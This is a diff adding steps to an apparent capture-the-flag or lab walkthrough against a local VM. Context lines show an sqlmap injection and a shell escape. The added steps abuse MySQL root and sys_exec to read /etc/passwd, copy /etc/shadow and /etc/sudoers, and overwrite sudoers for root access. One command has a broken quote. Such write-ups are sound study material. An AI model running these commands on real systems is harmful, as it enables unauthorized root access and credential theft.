@@ -53,3 +53,59 @@ sqlmap -u "http://192.168.32.49/checklogin.php" --data "myusername=%27&mypasswor
  /////////////////////
  echo os.system('/bin/bash')
  
+ AS MYSQL is running we can connect to the MYSQL database
+ ////////////////////
+ mysql -u root -h localhost
+ 
+ -u = username
+ -h = hostname
+ 
+ Once into MYSQL server check the version of MYSQL
+ //////////////////
+ select VERSION();
+ 
+ Load the passwd file into MYSQL
+ ////////////////////////
+ select load_file('/etc/passwd');
+ 
+ As /etc/shadow can only be edited by root in a normal shell we need to bypass these permissions using root access gained in MYSQL by copying the contents of
+ /etc/shadow to a file we can edit as a normal user using sys_exec
+ ///////////////////////
+ select sys_exec("cat /etc/shadow > /tmp/shadow")
+ 
+ Now we assign an owner to the new 'shadow' file
+ ///////////////////////
+ select sys_exec(chown three /tmp/shadow")
+ 
+ REPEAT these shadow steps for sudoers file
+ //////////////////////
+ select sys_exec('cat /etc/sudoers > /tmp/sudo');
+ select sys_exec('chown three /tmp/sudo; chmod 755 /tmp/sudo');
+ 
+ EDIT /tmp/sudo - we need to add three to the sudoers list in the sudo file we can edit
+ /////////////////////
+ three ALL=(ALL) ALL
+ 
+ IF /tmp/sudo BLANK:
+ 
+ root ALL=(ALL) ALL
+ three ALL=(ALL) ALL
+ 
+ and save the file
+ 
+ LOG BACK INTO MYSQL as root
+ ///////////////////
+ mysql -u root -h localhost
+ 
+ OVERWRITE /etc/sudoers with /tmp/sudo
+ ///////////////////
+ select sys_exec('cat /tmp/sudo > /etc/sudoers');
+ 
+ SSH as three
+ //////////////////
+ ssh three@192.168.32.49
+ 
+ Spawn an interactive shell and gain root access (now in the sudoers file)
+ /////////////////
+ echo os.system('/bin/bash') && sudo su -
+ 
